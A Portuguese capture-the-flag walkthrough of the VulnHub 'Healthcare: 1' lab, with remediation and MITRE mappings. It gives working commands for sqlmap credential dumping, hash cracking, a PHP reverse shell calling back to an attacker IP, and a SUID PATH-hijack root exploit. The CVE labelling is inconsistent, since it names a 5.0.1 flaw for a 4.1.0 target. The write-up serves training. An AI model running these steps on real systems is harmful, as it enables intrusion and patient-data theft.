# Healthcare: 1 — Vazamento de Dados de Pacientes, Edição Manual

Healthcare: 1 roda OpenEMR v4.1.0, um sistema de prontuários eletrônicos de código aberto com uma vulnerabilidade de SQL injection bem documentada no endpoint de login. O sqlmap dumpa a tabela de usuários, credenciais quebradas dão acesso admin, e o editor de arquivos PHP do painel OpenEMR te deixa dropar um reverse shell diretamente na aplicação. Uma vez na box, um binário SUID chamado `healthcheck` chama `fdisk` sem caminho absoluto, tornando-o um alvo perfeito de PATH hijacking para um shell root instantâneo. A ironia de um sistema de saúde ser a coisa menos saudável na rede não passa despercebida. Pesado, mano.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Healthcare: 1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/healthcare-1,522/ |
| **Técnicas** | Recon Nmap, enumeração web com Dirb/Gobuster, fingerprinting de versão OpenEMR, SQLi com sqlmap, substituição de arquivo PHP no painel admin, PHP reverse shell, movimento lateral, PATH hijacking via binário SUID |
| **CVEs** | CVE-2018-15140 (SQLi OpenEMR 5.0.1), CWE-89 (SQL Injection), CWE-732 (Permissões SUID Incorretas), CWE-427 (Elemento de Caminho de Busca Não Controlado) |
| **Grupos APT** | APT10 (Stone Panda): especificamente alveja sistemas do setor de saúde para roubo de dados de pacientes e propriedade intelectual; FIN12: exclusivamente alveja organizações de saúde com ransomware, frequentemente explorando OpenEMR e sistemas EMR similares |

---

## Resumo do Ataque

```
netdiscover + nmap → HTTP (80), FTP (21)
  |
  +--> Dirb/Gobuster → /openemr/
          |
          +--> Fingerprint OpenEMR v4.1.0
                  |
                  +--> sqlmap → dump openemr.users → admin:anotheropenmrsuser
                          |
                          +--> Login admin → módulo Files → editar PHP config
                                  |
                                  +--> Substituir com PHP reverse shell → listener nc
                                          |
                                          +--> Shell (www-data) → encontrar creds do usuário medical
                                                  |
                                                  +--> su medical → encontrar SUID healthcheck
                                                          |
                                                          +--> PATH hijack fdisk → root
```

---

## Metodologia

1. Descoberta de hosts e enumeração de serviços
2. Brute-force de diretórios para descobrir instalação OpenEMR
3. Fingerprinting de versão OpenEMR
4. SQL injection com sqlmap contra endpoint de login do OpenEMR
5. Quebrar credenciais extraídas
6. Login admin; localizar editor de arquivo PHP no painel admin do OpenEMR
7. Substituir PHP config com payload de reverse shell
8. Disparar shell; estabilizar
9. Movimento lateral para usuário `medical` via credenciais descobertas
10. Enumeração SUID; PATH hijack no binário `healthcheck` para root

---

## Passo 1 — Descoberta de Hosts e Scan de Portas

```bash
sudo netdiscover -r 192.168.0.0/24
# Alvo: 192.168.0.158

nmap -sV -sC -A 192.168.0.158
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.x
80/tcp open  http    Apache httpd 2.4.x
```

HTTP é a superfície de ataque primária.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e Descoberta do OpenEMR

```bash
dirb http://192.168.0.158/ /usr/share/wordlists/dirb/common.txt
# ou
gobuster dir -u http://192.168.0.158/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
```

Descoberta: `/openemr/`, sistema de prontuários eletrônicos OpenEMR.

Acesse `http://192.168.0.158/openemr/`. A página de login revela a versão:

```bash
curl -s http://192.168.0.158/openemr/ | grep -i "version\|openemr"
# OpenEMR v4.1.0
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1595.002 — Escaneamento Ativo: Escaneamento de Vulnerabilidades

---

## Passo 3 — SQL Injection via sqlmap

OpenEMR 4.1.0 é vulnerável a SQL injection no endpoint de login. Execute o sqlmap:

```bash
sqlmap -u "http://192.168.0.158/openemr/interface/main/main_screen.php?auth=login&site=default" \
  --data "new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=test&languageChoice=1" \
  --dbs

sqlmap -u "http://192.168.0.158/openemr/interface/main/main_screen.php?auth=login&site=default" \
  --data "new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=test&languageChoice=1" \
  -D openemr -T users --dump
```

Credenciais dumpadas:

```
admin:3863efef9ee2bfbc51aea7f5e4e7b4f2 (MD5)
medical:[hash]
```

Quebre o MD5:

```bash
echo '3863efef9ee2bfbc51aea7f5e4e7b4f2' > /tmp/emr_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/emr_hash.txt
# admin:anotheropenmrsuser
```

**Nota do mundo real:** O OpenEMR é usado por mais de 100.000 unidades de saúde em todo o mundo, gerenciando milhões de prontuários de pacientes. O CVE-2018-15140 (e vulnerabilidades SQLi relacionadas na versão 4.x) permitia acesso não autenticado ao banco de dados de pacientes. O FIN12, grupo de ransomware focado em saúde, usou vulnerabilidades OpenEMR como vetor de acesso inicial em múltiplos comprometimentos hospitalares.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1552.001 — Credenciais em Arquivos

---

## Passo 4 — Upload de Shell via Editor de Arquivo PHP do Admin

Faça login no OpenEMR como admin:

```
http://192.168.0.158/openemr/ → admin:anotheropenmrsuser
```

Navegue até a funcionalidade de gerenciamento de arquivos no painel admin:

```
Administration → Files (ou Configuration)
```

Localize um arquivo PHP acessível via web e substitua seu conteúdo por um reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/[ip_atacante]/4444 0>&1'");
?>
```

Inicie um listener:

```bash
nc -lvnp 4444
```

Acesse o arquivo PHP modificado para disparar a execução. O callback chega como `www-data`.

**MITRE ATT&CK:** T1505.003 — Componente de Software do Servidor: Web Shell

---

## Passo 5 — Estabilização do Shell e Movimento Lateral

Estabilize o shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

Procure credenciais nos arquivos de configuração OpenEMR para movimento lateral ao usuário `medical`:

```bash
cat /var/www/html/openemr/sites/default/sqlconf.php
find /home -name "*.txt" -o -name "*.conf" 2>/dev/null
```

Se credenciais para `medical` forem encontradas:

```bash
su medical
```

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1078.003 — Contas Válidas: Contas Locais

---

## Passo 6 — PATH Hijacking via SUID para Root

Enumere binários SUID como `medical`:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Crítico: `/usr/bin/healthcheck` (ou caminho similar) tem SUID root. Inspecione o que ele faz:

```bash
strings /usr/bin/healthcheck
# Output inclui: fdisk -l
```

O binário chama `fdisk` sem caminho absoluto. Explorável via PATH hijacking:

```bash
# Criar um fdisk falso em /tmp
echo '#!/bin/bash' > /tmp/fdisk
echo '/bin/bash -p' >> /tmp/fdisk
chmod +x /tmp/fdisk

# Adicionar /tmp ao início do PATH
export PATH=/tmp:$PATH

# Executar o binário SUID
/usr/bin/healthcheck
```

O binário SUID executa `fdisk`, encontra `/tmp/fdisk` primeiro devido ao PATH modificado e o executa com privilégios SUID root:

```bash
id
# uid=1001(medical) gid=1001(medical) euid=0(root) groups=1001(medical)

cat /root/root.txt
```

gg. O sistema de saúde precisava de um check-up em si mesmo. Sensacional!

**Nota do mundo real:** PATH hijacking via binários SUID é uma técnica clássica de escalação de privilégios em Linux. Qualquer binário SUID que chama programas externos sem caminhos absolutos é vulnerável. `strings` em um binário é um dos primeiros passos de enumeração pós-exploração exatamente por essa razão.

**MITRE ATT&CK:** T1574.007 — Fluxo de Execução Hijackado: Interceptação de PATH; T1548.001 — Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Método |
|---|---|---|---|
| Hash admin | 3863efef9ee2bfbc51aea7f5e4e7b4f2 | openemr.users | dump sqlmap |
| Credenciais admin | admin:anotheropenmrsuser | Quebrado do hash | John rockyou |
| Credenciais medical | medical:[senha] | Config OpenEMR | sqlmap ou arquivo de config |
| Shell www-data | processo web | Editor PHP OpenEMR | Substituição de arquivo |
| Shell root | uid=0 (euid) | SUID healthcheck | PATH hijack fdisk |
| Flag root | {flag} | /root/root.txt | cat |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | SQLi OpenEMR (CVE-2018-15140) expõe dados de pacientes | OpenEMR usado por 100k+ unidades de saúde; prontuários e credenciais totalmente expostos | Fazer patch do OpenEMR imediatamente; regras WAF para endpoints de login de EMR |
| 2 | Editor de arquivo PHP no painel admin permite RCE direto | Qualquer editor de arquivo PHP em painel web admin equivale a RCE para um usuário admin | Desabilitar edição de PHP em produção; usar filesystems somente leitura para código da aplicação |
| 3 | Credenciais em config acessíveis ao processo web | Arquivos de config PHP lidos pelo www-data expõem todas as credenciais do banco | Arquivos de config devem ficar fora do web root e legíveis apenas pelo usuário da aplicação |
| 4 | Binário SUID chama programa externo sem caminho absoluto | PATH hijacking é uma descoberta consistente de privesc no mundo real | Sempre use caminhos absolutos em binários SUID; audite com `strings` |
| 5 | Dados de saúde (EMR) tratados como alvo de baixa criticidade | Prontuários eletrônicos contêm PII, PHI, dados financeiros: alto valor para ransomware e roubo de identidade | Sistemas de saúde requerem MFA, segmentação de rede e patching regular conforme HIPAA |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Escaneamento Ativo | Escaneamento de Vulnerabilidades | T1595.002 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Quebra de Senha | T1110.002 |
| Persistência | Persistência | Web Shell | T1505.003 |
| Execução | Execução | Interpretador de Script: Shell Unix | T1059.004 |
| Movimento Lateral | Movimento Lateral | Contas Válidas: Contas Locais | T1078.003 |
| Escalação de Privilégios | Escalação de Privilégios | Fluxo de Execução Hijackado: PATH | T1574.007 |
| Escalação de Privilégios | Escalação de Privilégios | Mecanismo de Controle de Elevação: Setuid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Fazer patch do OpenEMR**: upgrade para versão suportada e corrigida; aplicar mitigações de SQL injection
2. **Desabilitar edição de arquivo PHP em painéis admin**: nunca implante uma aplicação com editor PHP embutido em produção
3. **Mover arquivos de config para fora do web root**: config da aplicação deve ser legível apenas pelo usuário da aplicação, não pelo www-data
4. **Remover SUID do healthcheck**: binários SUID customizados devem ser evitados; se necessário, usar caminhos absolutos para todos os comandos externos
5. **Implementar MFA para admin OpenEMR**: sistemas de saúde que tratam PHI devem ter MFA conforme requisitos HIPAA

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Avaliação de Riscos | Classificar OpenEMR como ativo de alta criticidade; avaliar exposição a CVE |
| Proteger | Controle de Acesso | MFA para todo acesso admin ao EMR; restringir edição de PHP |
| Proteger | Segurança de Dados | Criptografar dados de pacientes em repouso; arquivos de config fora do web root |
| Detectar | Anomalias | Alertar em modificações inesperadas de arquivo PHP; novas cron jobs; assinaturas sqlmap |
| Responder | Planejamento de Resposta | Fazer patch do OpenEMR; rotacionar todas as credenciais; investigar exposição de dados |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-2 | Remediação de Falhas | Fazer patch do OpenEMR; workflow de gestão de patches para sistemas de saúde |
| IA-2(1) | Autenticação Multi-Fator | MFA para todas as contas admin OpenEMR |
| SC-28 | Proteção de Informações em Repouso | Criptografar PHI em repouso; arquivos de config com permissões restritas |
| CM-6 | Configurações | Sem edição de PHP; caminhos absolutos em binários SUID |
| AC-6 | Menor Privilégio | Permissões mínimas para www-data; remover SUID de binários customizados |

### CISA KEV

Vulnerabilidades de SQL injection no OpenEMR são rastreadas em orientações CISA para o setor de saúde (AA20-302A, AA21-321A). A CISA especificamente aponta sistemas EMR como alvos de alta prioridade para patching. O grupo de ransomware FIN12 é nomeado no CISA AA21-321A como ativamente explorando software de saúde.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL3 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Configuração de Ativos | MIL2 |

---

## Considerações Finais

Healthcare: 1 é uma box perturbadora. O OpenEMR é software real usado por hospitais reais tratando dados de pacientes reais. O CVE-2018-15140 foi uma vulnerabilidade real em sistemas de produção reais. FIN12 e APT10 são grupos reais que comprometeram organizações de saúde reais usando exatamente essa cadeia de ataque.

A box ensina três lições importantes além das técnicas: (1) sistemas de saúde são alvos de alto valor; (2) software EMR sem patch coloca diretamente em risco a privacidade dos pacientes; e (3) binários SUID em aplicações de saúde chamam ferramentas externas sem caminhos absolutos com frequência alarmante.

Se essa box parece rotineira como CTF, lembre que a mesma cadeia se desdobrou em hospitais reais, afetando pacientes reais. É por isso que o HIPAA e as orientações CISA para saúde existem.

Thanks guys!! (❍ᴥ❍ʋ)
